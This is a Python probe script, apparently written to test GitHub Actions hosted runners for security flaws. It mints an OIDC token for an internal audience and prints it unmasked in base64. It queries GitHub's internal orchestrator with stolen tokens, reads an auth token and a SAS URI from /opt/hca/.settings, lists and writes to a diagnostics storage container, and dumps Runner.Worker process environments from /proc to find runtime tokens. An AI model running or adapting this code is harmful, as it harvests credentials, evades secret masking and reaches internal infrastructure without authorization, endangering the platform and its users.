#!/usr/bin/env python3
"""U6 probe7: HCA credential -> internal orchestrator (hosted-compute-ro audience)."""
import base64
import json
import os
import subprocess
import urllib.error
import urllib.request

OUT = []
BASE_RO = "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"


def hdr(t):
    OUT.append("\n" + "=" * 70)
    OUT.append("### " + t)
    OUT.append("=" * 70)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=20, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(2000).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


def jwt(tok):
    p = tok.split(".")
    if len(p) != 3:
        return None, None

    def dec(s):
        s += "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))
    return dec(p[0]), dec(p[1])


hdr("1. mint an OIDC token for the INTERNAL audience named in the IMDS tags")
OUT.append("IMDS tag says: hosted_compute.ro_audience=api://hosted-compute-ro")
OUT.append("IMDS tag says: hosted_compute.base_ro_url=%s/vm/v1" % BASE_RO)
url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
utok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
st, h, body = http(url + "&audience=api://hosted-compute-ro",
                   {"Authorization": "Bearer " + utok})
idt = ""
if st == 200:
    idt = json.loads(body)["value"]
    h_, c_ = jwt(idt)
    OUT.append("minted aud=api://hosted-compute-ro len=%d" % len(idt))
    OUT.append("claims: %s" % json.dumps(c_ if False else c_, indent=1))
OUT.append("token b64 (unmasked): %s" % base64.b64encode(idt.encode()).decode()[:1200])

hdr("2. call GitHub's internal read-only orchestrator with that OIDC token")
paths = ["/vm/v1", "/vm/v1/", "/vm/v1/status", "/v1/", "/v1/trace", "/vm/v1/machine"]
for p in paths:
    st, h, body = http(BASE_RO + p, {"Authorization": "Bearer " + idt})
    OUT.append("\nGET %-16s -> %s" % (p, st))
    OUT.append("   %s" % body[:600].replace("\n", " "))

hdr("2b. same, but with the HCA authToken from /opt/hca/.settings")
cfg = json.loads(open("/opt/hca/.settings", "rb").read())
for p in ("/vm/v1", "/v1/trace"):
    st, h, body = http(BASE_RO + p, {"Authorization": "Bearer " + cfg["authToken"]})
    OUT.append("\nHCA-token GET %-14s -> %s  %s" % (p, st, body[:300].replace("\n", " ")))

hdr("3. anonymous access to GitHub's diagnostics container (no SAS)")
sas = cfg["diagnosticsSasUri"]
base, q = sas.split("?", 1)
st, h, body = http(base + "?restype=container&comp=list")
OUT.append("LIST (anon) -> %s  %s" % (st, body[:500].replace("\n", " ")))
st, h, body = http(base + "?restype=container")
OUT.append("container props (anon) -> %s %s" % (st, body[:300].replace("\n", " ")))

hdr("4. prove the SAS-write is real and repeatable: two PUTs, compare ETag/CRC")
name = "u6-probe-%s.txt" % os.environ.get("GITHUB_RUN_ID", "x")
for i, content in enumerate((b"U6 probe v1\n", b"U6 probe v2 different bytes\n")):
    st, h, body = http(base + "/" + name + "?" + q,
                       {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"},
                       method="PUT", data=content)
    OUT.append("PUT #%d (%d bytes) -> %s  etag=%s crc64=%s reqid=%s" % (
        i + 1, len(content), st, h.get("ETag"), h.get("x-ms-content-crc64"),
        h.get("x-ms-request-id")))

hdr("5. FULL env of the Runner.Worker process (find ACTIONS_RUNTIME_TOKEN)")
for d in ("/proc",):
    for pid in sorted(os.listdir(d)):
        if not pid.isdigit():
            continue
        try:
            cmd = open("%s/%s/cmdline" % (d, pid), "rb").read().replace(b"\0", b" ").decode()
        except Exception:  # noqa: BLE001
            continue
        if "Runner.Worker" in cmd or "Runner.Listener" in cmd:
            OUT.append("\n-- pid %s: %s" % (pid, cmd[:100]))
            try:
                env = open("%s/%s/environ" % (d, pid), "rb").read().split(b"\0")
                for kv in env:
                    if b"=" in kv:
                        k, v = kv.split(b"=", 1)
                        k = k.decode(errors="replace")
                        v = v.decode(errors="replace")
                        if len(v) > 90:
                            v = v[:40] + "...<len=%d>" % len(v)
                        OUT.append("   %s=%s" % (k, v))
            except Exception as e:  # noqa: BLE001
                OUT.append("   environ ERR %r" % (e,))

hdr("6. GITHUB_TOKEN read of the private repo (set via env this time)")
tk = os.environ.get("GITHUB_TOKEN", "")
OUT.append("len=%d" % len(tk))
for repo in ("austindanson1/ghb-u6-pages", "austindanson1/ghb-u6-private"):
    st, h, body = http("https://api.github.com/repos/" + repo,
                       {"Authorization": "token " + tk, "User-Agent": "u6"})
    OUT.append("  %-34s -> %s" % (repo, st))
for k, v in h.items():
    if k.lower().startswith("x-") and "scope" in k.lower():
        OUT.append("  %s: %s" % (k, v))

text = "\n".join(OUT)
print(text)
with open(os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "probe-G.txt"), "w") as f:
    f.write(text)
